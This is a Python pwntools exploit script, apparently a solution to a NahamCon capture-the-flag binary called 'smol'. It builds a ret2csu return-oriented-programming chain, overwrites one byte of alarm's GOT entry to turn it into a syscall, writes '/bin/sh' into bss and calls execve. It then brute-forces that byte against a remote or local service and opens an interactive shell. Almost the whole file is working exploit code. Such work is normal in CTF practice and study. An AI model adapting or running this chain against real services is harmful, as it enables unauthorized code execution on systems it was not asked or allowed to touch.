#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./smol')

payload  = b''
payload += 0xc * b'A'

# CSU
'''
  4011b0:	4c 89 f2             	mov    rdx,r14
  4011b3:	4c 89 ee             	mov    rsi,r13
  4011b6:	44 89 e7             	mov    edi,r12d
  4011b9:	41 ff 14 df          	call   QWORD PTR [r15+rbx*8]
  4011bd:	48 83 c3 01          	add    rbx,0x1
  4011c1:	48 39 dd             	cmp    rbp,rbx
  4011c4:	75 ea                	jne    4011b0 <__libc_csu_init+0x40>
  4011c6:	48 83 c4 08          	add    rsp,0x8
  4011ca:	5b                   	pop    rbx
  4011cb:	5d                   	pop    rbp
  4011cc:	41 5c                	pop    r12
  4011ce:	41 5d                	pop    r13
  4011d0:	41 5e                	pop    r14
  4011d2:	41 5f                	pop    r15
  4011d4:	c3                   	ret
'''

pop_rbx_rbp_r12_r13_r14_r15 = 0x4011ca
set_rdx_rsi_rdi_call_r15 = 0x4011b0

# alarm -> syscall
# set up regs
payload += p64(pop_rbx_rbp_r12_r13_r14_r15)
payload += p64(0) # rbx
payload += p64(1) # rbp to get pass check
payload += p64(0) # r12 -> edi this will be edi stdin for read
payload += p64(binary.got.alarm) # r13 -> rsi pointer to alarm
payload += p64(1) # r14 -> rdx
payload += p64(binary.got.read) # pointer to read

# this will call read to read one byte and overwrite alarm
payload += p64(set_rdx_rsi_rdi_call_r15)
payload += 7 * p64(0) # add rsp,0x8, 6 pops at end


# now put /bin/sh in bss
# set up regs
payload += p64(pop_rbx_rbp_r12_r13_r14_r15)
payload += p64(0) # rbx
payload += p64(1) # rbp to get pass check
payload += p64(0) # r12 -> edi this will be edi stdin for read
payload += p64(binary.bss()) # r13 -> rsi pointer to bss
payload += p64(0x3b) # r14 -> rdx (/bin/sh\0) + padding to get rax = 0x3b for syscall
payload += p64(binary.got.read) # pointer to read

# this will call read to read /bin/sh\0 into bss now
payload += p64(set_rdx_rsi_rdi_call_r15)
payload += 7 * p64(0) # add rsp,0x8, 6 pops at end


# rest of payload assume alarm -> syscall, call execve
# set up regs
payload += p64(pop_rbx_rbp_r12_r13_r14_r15)
payload += p64(0) # rbx
payload += p64(1) # rbp to get pass check
payload += p64(binary.bss()) # r12 -> edi this will be rdi
payload += p64(0) # r13 -> rsi
payload += p64(0) # r14 -> rdx 
payload += p64(binary.got.alarm) # pointer to syscall

# this will call execve
payload += p64(set_rdx_rsi_rdi_call_r15)
payload += 7 * p64(0) # add rsp,0x8, 6 pops at end

b = 0x0
# local and remote values from bruteforce
'''
if args.REMOTE:
	b = 0x28
else:
	b = 0x19
'''

context.log_level = 'WARN'

while b <= 0xff:
	if args.REMOTE:
		p = remote('challenge.nahamcon.com', 31135)
	else:
		# socat TCP-LISTEN:9999,reuseaddr,fork EXEC:$PWD/smol,pty,stderr,setsid,sigint,sane,rawer
		p = remote('localhost', 9999)

	try:
		p.send(payload)
		time.sleep(.1)

		log.warn('testing b=' + hex(b))
		p.send(p8(b)) 
		time.sleep(.1)
		b += 1

		# /bin/sh send padded to 0x3b so rax has syscall number for execve
		p.send(b'/bin/sh\0' + (0x3b-8) * b'A')
		time.sleep(.1)

		p.sendline('echo shell')
		# to catch tty control errors, just lazy and try again
		if b'shell' in p.recvline():
			p.interactive()
			break
		if b'shell' in p.recvline():
			p.interactive()
			break
	except:
		p.close()

